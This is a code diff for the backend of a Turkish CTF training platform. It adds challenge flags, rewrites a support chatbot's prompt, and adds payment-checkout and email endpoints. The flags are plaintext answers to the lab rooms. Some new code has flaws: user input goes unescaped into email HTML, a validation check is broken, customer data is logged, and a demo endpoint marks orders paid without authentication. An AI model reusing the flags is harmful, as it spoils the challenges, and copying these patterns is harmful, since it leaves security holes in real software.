@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const { Pool } = require('pg');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
@@ -521,6 +522,11 @@ const ROOM_FLAGS = {
   'web-13': 'siberkampus{html_comments_developer_secrets}',
   'web-14': 'siberkampus{directory_traversal_root_access}',
   'web-15': 'siberkampus{cookie_tampering_privilege_escalation}',
+  
+  'web-16': 'siberkampus{lfi_log_poisoning_rce}',
+  'web-17': 'siberkampus{api_bola_unauthorized_read}',
+  'web-18': 'siberkampus{nosql_operator_injection_bypass}',
+  'web-19': 'siberkampus{idor_privilege_escalation_admin}',
 
   'net-01': 'siberkampus{nmap_service_scan_discovered}'
 };
@@ -631,8 +637,9 @@ app.post('/api/rooms/solve', authenticateToken, async (req, res) => {
     // Get max points of room from sk-data (handled dynamically, standard is 50/75/100/120/150 etc.)
     // Let's deduce default points by room ID prefix/suffix if not provided
     let roomBasePoints = 50;
-    if (room_id.endsWith('-02') || room_id.endsWith('-05') || room_id.endsWith('-06')) roomBasePoints = 75;
-    else if (room_id.endsWith('-03') || room_id.endsWith('-07')) roomBasePoints = 100;
+    if (room_id.endsWith('-02') || room_id.endsWith('-05') || room_id.endsWith('-06') || room_id === 'web-17') roomBasePoints = 75;
+    else if (room_id === 'web-16') roomBasePoints = 80;
+    else if (room_id.endsWith('-03') || room_id.endsWith('-07') || room_id === 'web-18') roomBasePoints = 100;
     else if (room_id.endsWith('-08')) roomBasePoints = 120;
     else if (room_id.endsWith('-09')) roomBasePoints = 150;
     else if (room_id.endsWith('-10')) roomBasePoints = 200;
@@ -1171,16 +1178,16 @@ app.delete('/api/admin/blogs/:id', authenticateToken, async (req, res) => {
 // ==========================================
 // SUPPORT CHATBOT API
 // ==========================================
-const SUPPORT_SYSTEM_PROMPT = `Sen siberkampus platformunun canlı destek ekibinden Eylül'sün. Amacın, siberkampus platformunu ziyaret eden veya kullanan kişilere platform hakkında bilgi vermek, onları yönlendirmek ve yardımcı olmaktır.
+const SUPPORT_SYSTEM_PROMPT = `Sen Siber Kampüs Akademi platformunun canlı destek ekibinden Eylül'sün. Amacın, platformu ziyaret eden veya kullanan kişilere bilgi vermek, onları yönlendirmek ve yardımcı olmaktır.
 Aşağıdaki bilgilere göre yanıt ver:
-1. Site Nedir? siberkampus, sıfırdan siber güvenlik uzmanı olmayı sağlayan tarayıcı tabanlı, pratik ve oyunlaştırılmış bir CTF & Hacking laboratuvarı eğitim platformudur.
-2. Amaç: Siber güvenliği sıkıcı teorik derslerden çıkarıp, doğrudan tarayıcıda çalışan gerçek sistemler üzerinde sömürü ve savunma yaparak klavyede öğretmektir.
-3. Kurucu: Yusuf İslam Yetkin. Finans ve kurumsal enterprise sistemlerde uzun yıllar çalışmış, ölçeklenebilir güvenli sistemler tasarlamış deneyimli bir yazılım mimarıdır.
-4. Fiyatlar: Platformdaki temel oda sistemi ve laboratuvarlar tamamen ücretsizdir. Ancak 'Pentest Web Sitesi Uzman Eğitimi' (ileri seviye sızma testi eğitimi) ücretlidir ve fiyatı 1200 TL'dir.
-5. Oda Sistemi Nedir? Web Exploitation, Linux Sistem Güvenliği ve Ağ Sızma Testi gibi kategorilerde interaktif laboratuvar odaları bulunur. Kullanıcılar 'Başlat' diyerek tarayıcı üzerinden hedef sisteme erişir, zafiyetleri sömürür, bayrakları (siberkampus{...} formatında) bulur ve sisteme girerek puan kazanır.
-6. İpuçları ve Sertifikalar: Her odada ipuçları bulunur. Çözülen odalar sonrasında doğrulanabilir sertifikalar kazanılır ve bu sertifikalar LinkedIn veya CV'ye eklenebilir.
-7. İletişim: destek@siberkampus.com e-posta adresinden veya site üzerindeki iletişim formundan bize ulaşabilirler.
-8. Kurallar: Kısa, öz ve dost canlısı (fakat profesyonel) cevaplar ver. Markdown formatını (kalın yazma, listeler) ve siber emojileri (💻, 🔍, 🛡️, 🚀, 💚) yerinde kullan. Platform dışı alakasız konularda (yemek tarifi, genel yazılım dışı sohbet vb.) kibarca sadece siberkampus konularında yardımcı olabileceğini belirt.`;
+1. Site Nedir? Siber Kampüs Akademi, sıfırdan siber güvenlik uzmanı olmayı sağlayan tarayıcı tabanlı, pratik ve oyunlaştırılmış bir siber güvenlik laboratuvarı eğitim platformudur.
+2. Amaç: Siber güvenliği sıkıcı teorik derslerden çıkarıp, doğrudan tarayıcıda çalışan gerçek sistemler üzerinde zafiyet analizi ve savunma yaparak klavyede öğretmektir.
+3. Kurucu: Yusuf İslam Yetkin. Finans ve kurumsal enterprise sistemlerde uzun yıllar çalışmış deneyimli bir yazılım mimarıdır.
+4. Fiyatlar ve Paketler: Platformda 3 adet eğitim programı bulunur. 1) Ücretsiz Temel Siber Güvenlik Eğitimi (0 TL), 2) İleri Düzey Web Siber Güvenlik Uzmanı Eğitimi (6.000 TL), 3) 1'e 1 Canlı Siber Güvenlik Eğitimi (12.000 TL).
+5. Oda Sistemi: Web, Linux ve Ağ kategorilerinde interaktif laboratuvar odaları bulunur. Kullanıcılar zafiyetleri çözerek siberkampus{...} formatında flag bulur.
+6. Sertifikalar: Eğitim yollarını başarıyla tamamlayanlar doğrulanabilir sertifikalar kazanır.
+7. İletişim: destek@siberkampus.com e-posta adresinden bize ulaşabilirler.
+8. Kurallar: Yanıtlarını her zaman çok kısa tut (en fazla 2 kısa cümle). Asla uzun listeler, açıklamalar veya paragraflar yazma, son derece kullanıcı dostu ol. Kısa, öz ve dost canlısı (fakat profesyonel) cevaplar ver.`;
 
 async function callGemini(message, history) {
   const apiKey = process.env.GEMINI_API_KEY;
@@ -1276,28 +1283,28 @@ function getMockSupportResponse(message) {
   const s = (message || '').toLowerCase();
   
   if (s.includes('kurucu') || s.includes('yusuf') || s.includes('islam') || s.includes('yetkin')) {
-    return 'Siber Kampüs\'ün kurucusu **Yusuf İslam Yetkin**\'dir. Kendisi uzun yıllar finans ve enterprise sistemlerde çalışmış, ölçeklenen güvenli sistemler kurmuş deneyimli bir yazılım mühendisidir. 💻';
+    return 'Siber Kampüs Akademi\'nin kurucusu Yusuf İslam Yetkin\'dir. 💻';
   }
   if (s.includes('fiyat') || s.includes('ücret') || s.includes('para') || s.includes('kaç tl') || s.includes('satın al') || s.includes('öde')) {
-    return 'Siber Kampüs\'te temel oda laboratuvarları tamamen **ücretsizdir**! Ancak, sızma testi konusunda uzmanlaşmak isteyenler için **Pentest Web Sitesi Uzman Eğitimi** paketimiz mevcuttur ve ücreti **1200 TL**\'dir. 💚';
+    return 'Üç eğitim paketimiz var: Ücretsiz Temel Eğitim (0 TL), İleri Düzey Web Eğitimi (6.000 TL) ve 1\'e 1 Canlı Eğitim (12.000 TL). 💚';
   }
   if (s.includes('oda') || s.includes('laboratuvar') || s.includes('makine') || s.includes('lab')) {
-    return 'Oda sistemimiz; Web Exploitation, Linux Sistem Güvenliği ve Ağ Sızma Testi gibi kategorilerde interaktif hacking laboratuvarlarından oluşur. Her odanın kendine ait `siberkampus{...}` şeklinde bayrağı (flag) bulunur. Bunları bularak puan kazanabilirsiniz. 🔍';
+    return 'Web, Linux ve Ağ kategorilerinde zafiyet laboratuvarlarımız bulunur. Çözerek flag bulabilirsiniz. 🔍';
   }
   if (s.includes('site') || s.includes('nedir') || s.includes('ne amaçla') || s.includes('siberkampus') || s.includes('siber kampüs')) {
-    return 'Siber Kampüs; pratik CTF görevleri ve gerçek hacking laboratuvarlarıyla tarayıcınızdan sıfırdan siber güvenlik uzmanı olmanızı sağlayan uygulamalı ve oyunlaştırılmış bir eğitim platformudur. 🚀';
+    return 'Siber Kampüs Akademi; tarayıcı tabanlı, pratik ve oyunlaştırılmış bir siber güvenlik laboratuvarı eğitim platformudur. 🚀';
   }
   if (s.includes('başla') || s.includes('nasıl')) {
-    return 'Eğitime başlamak çok kolay! Kayıt olduktan sonra Laboratuvarlar sayfasına giderek başlangıç odalarından birini seçebilir ve "Başlat" butonuna basarak doğrudan çözmeye başlayabilirsiniz. 💻';
+    return 'Kayıt olup, Laboratuvarlar sayfasından dilediğiniz odayı seçip "Başlat" diyerek hemen başlayabilirsiniz! 💻';
   }
   if (s.includes('sertifika') || s.includes('rozet')) {
-    return 'Evet! Bir öğrenme yolunu (örneğin Web veya Linux) başarıyla tamamladığınızda doğrulanabilir bir sertifika kazanırsınız. Bu sertifikayı CV veya LinkedIn profilinize ekleyebilirsiniz. 🎖️';
+    return 'Eğitim yollarını tamamladığınızda CV veya LinkedIn profilinize ekleyebileceğiniz doğrulanabilir sertifikalar kazanırsınız. 🎖️';
   }
   if (s.includes('selam') || s.includes('merhaba') || s.includes('hey')) {
-    return 'Merhaba! Ben Eylül. Canlı destek ekibindeyim. Siber Kampüs platformu, kurucumuz Yusuf İslam Yetkin, ücretsiz laboratuvar odaları veya 1200 TL değerindeki Pentest eğitimi hakkında merak ettiğiniz tüm soruları yanıtlayabilirim. Size nasıl yardımcı olabilirim? 💚';
+    return 'Merhaba! Ben Eylül, Siber Kampüs Akademi canlı destek ekibinden. Size nasıl yardımcı olabilirim? 💚';
   }
   
-  return 'Anladım! Ben canlı destek botu Eylül. Siber Kampüs\'ün kurucusu Yusuf İslam Yetkin, ücretsiz odalarımız veya 1200 TL değerindeki Pentest Web Sitesi Uzman Eğitimi hakkında sorularınızı yanıtlayabilirim. Başka nasıl yardımcı olabilirim? 🙂';
+  return 'Eylül olarak size yardımcı olmaktan mutluluk duyarım. Ücretsiz (0 TL), İleri Düzey Web (6.000 TL) veya 1\'e 1 Canlı (12.000 TL) eğitimlerimizle ilgili sorularınızı sorabilirsiniz. 🙂';
 }
 
 app.post('/api/support/chat', async (req, res) => {
@@ -1324,6 +1331,559 @@ app.post('/api/support/chat', async (req, res) => {
     console.error('Support Chatbot Error:', err);
     const reply = getMockSupportResponse(message.trim());
     return res.json({ reply, warning: 'LLM API failed, using rule-based response' });
+  }
+});
+
+// ==========================================
+// CHECKOUT / PAYMENT APIs (PayTR)
+// ==========================================
+
+const PAYTR_MERCHANT_ID = process.env.PAYTR_MERCHANT_ID || '';
+const PAYTR_MERCHANT_KEY = process.env.PAYTR_MERCHANT_KEY || '';
+const PAYTR_MERCHANT_SALT = process.env.PAYTR_MERCHANT_SALT || '';
+const SITE_URL = process.env.SITE_URL || 'https://www.siberkampus.org';
+
+const PLANS = {
+  'one-on-one':  { name: "1'e 1 Canlı Siber Güvenlik Eğitimi", price: 1000, subscription: 'one-on-one' }
+};
+
+// Brevo SMTP e-posta gönderici
+const nodemailer = require('nodemailer');
+async function sendBrevoEmail(toEmail, toName, subject, htmlContent) {
+  const smtpLogin = process.env.BREVO_SMTP_LOGIN;
+  const smtpPassword = process.env.BREVO_SMTP_PASSWORD;
+  if (!smtpLogin || !smtpPassword) { console.warn('BREVO_SMTP_LOGIN veya BREVO_SMTP_PASSWORD tanımlı değil, e-posta gönderilemedi.'); return; }
+  try {
+    const transporter = nodemailer.createTransport({
+      host: 'smtp-relay.brevo.com',
+      port: 587,
+      secure: false,
+      auth: { user: smtpLogin, pass: smtpPassword },
+    });
+    await transporter.sendMail({
+      from: '"Siber Kampüs Akademi" <destek@siberkampus.org>',
+      to: toName ? `"${toName}" <${toEmail}>` : toEmail,
+      subject,
+      html: htmlContent,
+    });
+    console.log('✅ E-posta gönderildi:', toEmail);
+  } catch (err) { console.error('Brevo SMTP e-posta hatası:', err); }
+}
+
+function buildPasswordSetEmail(name, link) {
+  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;padding:0;background:#f4f6f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
+  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f4;padding:40px 16px;">
+    <tr><td align="center">
+      <table width="100%" cellpadding="0" cellspacing="0" style="max-width:560px;">
+
+        <!-- Header -->
+        <tr><td style="background:#0a1a10;border-radius:16px 16px 0 0;padding:32px 40px;text-align:center;">
+          <div style="margin-bottom:20px;">
+            <span style="display:inline-block;width:38px;height:38px;border:2px solid #00e57a;border-radius:9px;line-height:38px;font-size:17px;color:#00e57a;font-family:monospace;font-weight:bold;text-align:center;">&gt;_</span>
+            <span style="font-size:17px;font-weight:700;color:#ffffff;margin-left:10px;vertical-align:middle;">Siber Kampüs <span style="color:#00e57a;">Akademi</span></span>
+          </div>
+          <div style="display:inline-block;background:#00e57a18;border:1px solid #00e57a50;color:#00e57a;font-size:11px;font-family:monospace;letter-spacing:.15em;text-transform:uppercase;padding:5px 16px;border-radius:20px;margin-bottom:16px;">✓ Ödeme Onaylandı</div>
+          <h1 style="color:#ffffff;font-size:26px;margin:0;font-weight:700;">Hoş Geldiniz, ${name}!</h1>
+        </td></tr>
+
+        <!-- Body -->
+        <tr><td style="background:#ffffff;padding:36px 40px;">
+          <p style="color:#374151;font-size:15px;line-height:1.75;margin:0 0 24px;">Eğitiminiz başarıyla aktifleştirildi. Hesabınıza erişmek için aşağıdaki butona tıklayarak şifrenizi belirleyin.</p>
+
+          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:20px 24px;margin:0 0 28px;">
+            <div style="display:flex;align-items:center;gap:12px;">
+              <div>
+                <div style="color:#166534;font-size:13px;font-weight:600;margin-bottom:2px;">1'e 1 Canlı Siber Güvenlik Eğitimi</div>
+                <div style="color:#4b7a60;font-size:12px;">Eğitiminiz hesabınıza tanımlandı</div>
+              </div>
+            </div>
+          </div>
+
+          <div style="text-align:center;margin:32px 0;">
+            <a href="${link}" style="display:inline-block;background:#059669;color:#ffffff;font-weight:700;font-size:15px;padding:15px 40px;border-radius:10px;text-decoration:none;letter-spacing:.01em;">Şifremi Belirle →</a>
+          </div>
+
+          <div style="background:#fafafa;border:1px solid #e5e7eb;border-radius:8px;padding:16px 20px;margin-top:24px;">
+            <p style="color:#6b7280;font-size:12px;margin:0 0 6px;font-weight:600;">Bu bağlantı 72 saat geçerlidir.</p>
+            <p style="color:#9ca3af;font-size:11px;margin:0;word-break:break-all;">${link}</p>
+          </div>
+        </td></tr>
+
+        <!-- Steps -->
+        <tr><td style="background:#f9fafb;border-top:1px solid #e5e7eb;padding:28px 40px;">
+          <p style="color:#374151;font-size:13px;font-weight:600;margin:0 0 16px;">Sonraki adımlar:</p>
+          <table width="100%" cellpadding="0" cellspacing="0">
+            <tr>
+              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">1</span></td>
+              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Şifrenizi belirleyin</td>
+            </tr>
+            <tr>
+              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">2</span></td>
+              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Hesabınıza giriş yapın</td>
+            </tr>
+            <tr>
+              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">3</span></td>
+              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Eğitmeninizle ders programınızı oluşturun</td>
+            </tr>
+          </table>
+        </td></tr>
+
+        <!-- Footer -->
+        <tr><td style="background:#0a1a10;border-radius:0 0 16px 16px;padding:20px 40px;text-align:center;">
+          <p style="color:#4b7a60;font-size:11px;margin:0;">© 2026 Siber Kampüs Akademi &nbsp;·&nbsp; <a href="${SITE_URL}" style="color:#00e57a;text-decoration:none;">siberkampus.org</a></p>
+          <p style="color:#2d4a38;font-size:10px;margin:6px 0 0;">Bu e-postayı siz talep ettiniz. Sorun için: destek@siberkampus.org</p>
+        </td></tr>
+
+      </table>
+    </td></tr>
+  </table>
+  </body></html>`;
+}
+
+// POST /api/level-test/result — Seviye testi sonucunu e-posta ile gönder
+app.post('/api/level-test/result', async (req, res) => {
+  const { email, score, level, color, duration, phases, outcomes } = req.body;
+  if (!email || !score === undefined || !level) return res.status(400).json({ error: 'Eksik veri.' });
+
+  const phaseRows = (phases || []).map((p, i) => `
+    <tr>
+      <td style="padding:10px 14px;border-bottom:1px solid #0c2719;vertical-align:top;width:36px;">
+        <span style="display:inline-block;background:${color}18;color:${color};border:1px solid ${color}30;border-radius:6px;font-family:monospace;font-size:11px;font-weight:700;padding:3px 7px;">${String(i+1).padStart(2,'0')}</span>
+      </td>
+      <td style="padding:10px 14px;border-bottom:1px solid #0c2719;">
+        <div style="color:#9fc4b5;font-size:10px;font-family:monospace;letter-spacing:.1em;margin-bottom:2px;">${p.week}</div>
+        <div style="color:#cdeede;font-size:13px;font-weight:600;margin-bottom:2px;">${p.title}</div>
+        <div style="color:#74998a;font-size:12px;line-height:1.5;">${p.detail}</div>
+      </td>
+    </tr>`).join('');
+
+  const outcomeRows = (outcomes || []).map(o => `
+    <tr><td style="padding:4px 0;color:#00ff88;font-size:13px;width:18px;">✓</td><td style="padding:4px 0;color:#9fc4b5;font-size:12px;line-height:1.5;">${o}</td></tr>`).join('');
+
+  const pct = Math.round((score / 15) * 100);
+
+  const accentHex = color === '#ffd166' ? '#d97706' : color === '#a78bfa' ? '#7c3aed' : '#059669';
+
+  const phaseRowsHtml = (phases || []).map((p, i) => `
+    <tr>
+      <td style="padding:12px 16px;border-bottom:1px solid #f3f4f6;vertical-align:top;width:40px;">
+        <span style="display:inline-block;background:${accentHex}15;color:${accentHex};border:1px solid ${accentHex}30;border-radius:6px;font-family:monospace;font-size:11px;font-weight:700;padding:3px 8px;">${String(i+1).padStart(2,'0')}</span>
+      </td>
+      <td style="padding:12px 16px;border-bottom:1px solid #f3f4f6;">
+        <div style="color:#9ca3af;font-size:10px;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:3px;">${p.week}</div>
+        <div style="color:#111827;font-size:13px;font-weight:600;margin-bottom:3px;">${p.title}</div>
+        <div style="color:#6b7280;font-size:12px;line-height:1.5;">${p.detail}</div>
+      </td>
+    </tr>`).join('');
+
+  const outcomeRowsHtml = (outcomes || []).map(o => `
+    <tr>
+      <td style="padding:5px 0;vertical-align:top;width:22px;color:#059669;font-size:13px;font-weight:700;">✓</td>
+      <td style="padding:5px 0;color:#374151;font-size:13px;line-height:1.5;">${o}</td>
+    </tr>`).join('');
+
+  const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;padding:0;background:#f4f6f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
+  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f4;padding:40px 16px;">
+    <tr><td align="center">
+      <table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;">
+
+        <!-- Header -->
+        <tr><td style="background:#0a1a10;border-radius:16px 16px 0 0;padding:32px 40px;text-align:center;">
+          <div style="margin-bottom:20px;">
+            <span style="display:inline-block;width:38px;height:38px;border:2px solid #00e57a;border-radius:9px;line-height:38px;font-size:17px;color:#00e57a;font-family:monospace;font-weight:bold;text-align:center;">&gt;_</span>
+            <span style="font-size:17px;font-weight:700;color:#ffffff;margin-left:10px;vertical-align:middle;">Siber Kampüs <span style="color:#00e57a;">Akademi</span></span>
+          </div>
+          <div style="display:inline-block;background:${accentHex}22;border:1px solid ${accentHex}60;color:#ffffff;font-size:12px;font-family:monospace;letter-spacing:.12em;text-transform:uppercase;padding:6px 18px;border-radius:20px;margin-bottom:16px;">${level}</div>
+          <h1 style="color:#ffffff;font-size:24px;margin:0 0 8px;font-weight:700;">Seviye Testi Sonucun</h1>
+          <p style="color:#7fb89a;font-size:13px;margin:0;">Siber güvenlik bilgin analiz edildi.</p>
+        </td></tr>
+
+        <!-- Score -->
+        <tr><td style="background:#ffffff;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
+          <table width="100%" cellpadding="0" cellspacing="0">
+            <tr>
+              <td style="color:#374151;font-size:14px;font-weight:600;">Toplam Puan</td>
+              <td align="right" style="font-family:monospace;font-size:22px;font-weight:700;color:${accentHex};">${score} <span style="font-size:13px;color:#9ca3af;font-weight:400;">/ 15</span></td>
+            </tr>
+          </table>
+          <div style="height:8px;background:#f3f4f6;border-radius:4px;overflow:hidden;margin:12px 0 6px;">
+            <div style="height:100%;width:${pct}%;background:${accentHex};border-radius:4px;"></div>
+          </div>
+          <table width="100%" cellpadding="0" cellspacing="0">
+            <tr>
+              <td style="font-size:10px;color:#d1d5db;font-family:monospace;">Başlangıç</td>
+              <td align="center" style="font-size:10px;color:#d1d5db;font-family:monospace;">Orta</td>
+              <td align="right" style="font-size:10px;color:#d1d5db;font-family:monospace;">İleri</td>
+            </tr>
+          </table>
+        </td></tr>
+
+        <!-- Müfredat -->
+        <tr><td style="background:#ffffff;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
+          <p style="color:#111827;font-size:13px;font-weight:700;margin:0 0 4px;text-transform:uppercase;letter-spacing:.08em;">Önerilen Müfredat</p>
+          <p style="color:#9ca3af;font-size:12px;margin:0 0 16px;">Tahmini süre: <strong style="color:#374151;">${duration}</strong></p>
+          <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #f3f4f6;border-radius:10px;overflow:hidden;">
+            ${phaseRowsHtml}
+          </table>
+        </td></tr>
+
+        <!-- Outcomes -->
+        <tr><td style="background:#f9fafb;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
+          <p style="color:#111827;font-size:13px;font-weight:700;margin:0 0 16px;text-transform:uppercase;letter-spacing:.08em;">Program sonunda yapabileceklerin</p>
+          <table width="100%" cellpadding="0" cellspacing="0">
+            ${outcomeRowsHtml}
+          </table>
+        </td></tr>
+
+        <!-- CTA -->
+        <tr><td style="background:#ffffff;padding:32px 40px;text-align:center;border-bottom:1px solid #f3f4f6;">
+          <p style="color:#374151;font-size:14px;margin:0 0 20px;line-height:1.6;">Bu müfredatla birebir eğitim almak ister misin?</p>
+          <a href="${SITE_URL}/pricing" style="display:inline-block;background:#059669;color:#ffffff;font-weight:700;font-size:14px;padding:14px 36px;border-radius:10px;text-decoration:none;">Eğitim Programını İncele →</a>
+        </td></tr>
+
+        <!-- Footer -->
+        <tr><td style="background:#0a1a10;border-radius:0 0 16px 16px;padding:20px 40px;text-align:center;">
+          <p style="color:#4b7a60;font-size:11px;margin:0;">© 2026 Siber Kampüs Akademi &nbsp;·&nbsp; <a href="${SITE_URL}" style="color:#00e57a;text-decoration:none;">siberkampus.org</a></p>
+        </td></tr>
+
+      </table>
+    </td></tr>
+  </table>
+  </body></html>`;
+
+  try {
+    await sendBrevoEmail(email, null, 'Siber Kampüs — Seviye Testi Sonucun', html);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('Level test mail hatası:', err);
+    res.status(500).json({ error: 'E-posta gönderilemedi.' });
+  }
+});
+
+// POST /api/checkout/start — Ödeme başlat, PayTR iframe token al
+app.post('/api/checkout/start', async (req, res) => {
+  const { email, name, phone, address, plan_id } = req.body;
+  if (!email || !name || !plan_id) return res.status(400).json({ error: 'E-posta, ad soyad ve plan zorunludur.' });
+
+  const plan = PLANS[plan_id];
+  if (!plan) return res.status(400).json({ error: 'Geçersiz eğitim paketi.' });
+
+  try {
+    // PayTR bilgileri yoksa demo mod
+    if (!PAYTR_MERCHANT_ID || !PAYTR_MERCHANT_KEY || !PAYTR_MERCHANT_SALT) {
+      const merchant_oid = 'SK' + Date.now() + crypto.randomBytes(4).toString('hex');
+      try {
+        await pool.query(
+          'INSERT INTO orders (email, name, phone, plan_id, plan_name, amount, paytr_merchant_oid, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)',
+          [email.toLowerCase().trim(), name.trim(), (phone || '').trim(), plan_id, plan.name, plan.price, merchant_oid, 'pending']
+        );
+      } catch (dbErr) {
+        console.warn('Demo mod: orders tablosu bulunamadı, devam ediliyor.', dbErr.message);
+      }
+      return res.json({ status: 'success', token: 'DEMO_MODE', merchant_oid, demo: true });
+    }
+
+    const merchant_oid = 'SK' + Date.now() + crypto.randomBytes(4).toString('hex');
+    const user_ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1').split(',')[0].trim();
+    const payment_amount = String(plan.price);
+    const user_basket = Buffer.from(JSON.stringify([[plan.name, (plan.price / 100).toFixed(2), 1]])).toString('base64');
+    const no_installment = '1';
+    const max_installment = '0';
+    const currency = 'TL';
+    const test_mode = process.env.PAYTR_TEST_MODE === '1' ? '1' : '0';
+    const merchant_ok_url = SITE_URL + '/pricing?payment=success';
+    const merchant_fail_url = SITE_URL + '/pricing?payment=fail';
+
+    // PayTR hash string — dokümantasyondaki sıraya uygun
+    const hashStr = PAYTR_MERCHANT_ID + user_ip + merchant_oid + email.toLowerCase().trim() + payment_amount + user_basket + no_installment + max_installment + currency + test_mode;
+    const paytr_token = crypto.createHmac('sha256', PAYTR_MERCHANT_KEY).update(hashStr + PAYTR_MERCHANT_SALT).digest('base64');
+
+    // orders tablosuna pending kayıt
+    try {
+      await pool.query(
+        'INSERT INTO orders (email, name, phone, plan_id, plan_name, amount, paytr_merchant_oid, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)',
+        [email.toLowerCase().trim(), name.trim(), (phone || '').trim(), plan_id, plan.name, plan.price, merchant_oid, 'pending']
+      );
+    } catch (dbErr) {
+      console.warn('Orders tablosuna kayıt hatası (devam ediliyor):', dbErr.message);
+    }
+
+    // Telefon: frontend'den "5XXXXXXXXX" (10 hane) geliyor, başına 0 ekle → "05XXXXXXXXX"
+    let cleanPhone = (phone || '').replace(/\D/g, '');
+    if (cleanPhone.length === 10 && cleanPhone.startsWith('5')) cleanPhone = '0' + cleanPhone;
+    if (cleanPhone.length !== 11) cleanPhone = '05000000000';
+
+    const userAddress = (address || '').trim() || 'Türkiye';
+
+    // PayTR iframe token isteği
+    const params = new URLSearchParams({
+      merchant_id: PAYTR_MERCHANT_ID,
+      user_ip,
+      merchant_oid,
+      email: email.toLowerCase().trim(),
+      payment_amount,
+      paytr_token,
+      user_basket,
+      debug_on: '1',
+      no_installment,
+      max_installment,
+      user_name: name.trim(),
+      user_address: userAddress,
+      user_phone: cleanPhone,
+      merchant_ok_url,
+      merchant_fail_url,
+      timeout_limit: '30',
+      currency,
+      test_mode,
+      lang: 'tr'
+    });
+
+    console.log('=== PayTR TOKEN REQUEST ===');
+    console.log('merchant_id:', PAYTR_MERCHANT_ID);
+    console.log('merchant_oid:', merchant_oid);
+    console.log('email:', email.toLowerCase().trim());
+    console.log('payment_amount:', payment_amount);
+    console.log('user_phone:', cleanPhone);
+    console.log('user_address:', userAddress);
+    console.log('user_name:', name.trim());
+    console.log('test_mode:', test_mode);
+    console.log('user_ip:', user_ip);
+    console.log('user_basket:', user_basket);
+    console.log('hashStr (first 60):', hashStr.slice(0, 60));
+
+    const paytrRes = await fetch('https://www.paytr.com/odeme/api/get-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params.toString()
+    });
+    const paytrData = await paytrRes.json();
+
+    console.log('=== PayTR RESPONSE ===', JSON.stringify(paytrData));
+
+    if (paytrData.status === 'success') {
+      res.json({ status: 'success', token: paytrData.token, merchant_oid });
+    } else {
+      console.error('=== PayTR HATA ===', JSON.stringify(paytrData));
+      res.status(500).json({
+        error: 'Ödeme altyapısı başlatılamadı.',
+        reason: paytrData.reason || paytrData.err_msg || paytrData.err_code || JSON.stringify(paytrData)
+      });
+    }
+  } catch (err) {
+    console.error('Checkout start hatası:', err);
+    res.status(500).json({ error: 'Ödeme başlatılırken bir hata oluştu.', reason: err.message });
+  }
+});
+
+// POST /api/checkout/demo-complete — Demo modda ödeme simülasyonu
+app.post('/api/checkout/demo-complete', async (req, res) => {
+  if (PAYTR_MERCHANT_ID && PAYTR_MERCHANT_KEY && PAYTR_MERCHANT_SALT) {
+    return res.status(400).json({ error: 'Demo mod aktif değil.' });
+  }
+
+  const { merchant_oid } = req.body;
+  if (!merchant_oid) return res.status(400).json({ error: 'Sipariş numarası zorunludur.' });
+
+  try {
+    const orderResult = await pool.query('SELECT * FROM orders WHERE paytr_merchant_oid = $1', [merchant_oid]);
+    if (orderResult.rows.length === 0) return res.status(404).json({ error: 'Sipariş bulunamadı.' });
+    const order = orderResult.rows[0];
+
+    if (order.status === 'paid') return res.json({ status: 'already_paid' });
+
+    // Sipariş durumunu güncelle
+    await pool.query('UPDATE orders SET status = $1, paid_at = NOW() WHERE paytr_merchant_oid = $2', ['paid', merchant_oid]);
+
+    // Kullanıcıyı bul veya oluştur
+    let userId;
+    const existingUser = await pool.query('SELECT id, password_hash FROM users WHERE email = $1', [order.email]);
+
+    if (existingUser.rows.length > 0) {
+      userId = existingUser.rows[0].id;
+      const plan = PLANS[order.plan_id];
+      await pool.query(
+        'UPDATE users SET is_premium = true, is_vip = true, subscription = $1, phone = COALESCE(NULLIF($2,\'\'), phone) WHERE id = $3',
+        [plan ? plan.subscription : order.plan_id, order.phone || '', userId]
+      );
+      await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
+
+      if (existingUser.rows[0].password_hash && existingUser.rows[0].password_hash !== 'PENDING_SET') {
+        return res.json({ status: 'success', message: 'Eğitim aktifleştirildi.' });
+      }
+    } else {
+      const plan = PLANS[order.plan_id];
+      const newUser = await pool.query(
+        'INSERT INTO users (email, password_hash, name, phone, is_premium, is_vip, subscription) VALUES ($1, $2, $3, $4, true, true, $5) RETURNING id',
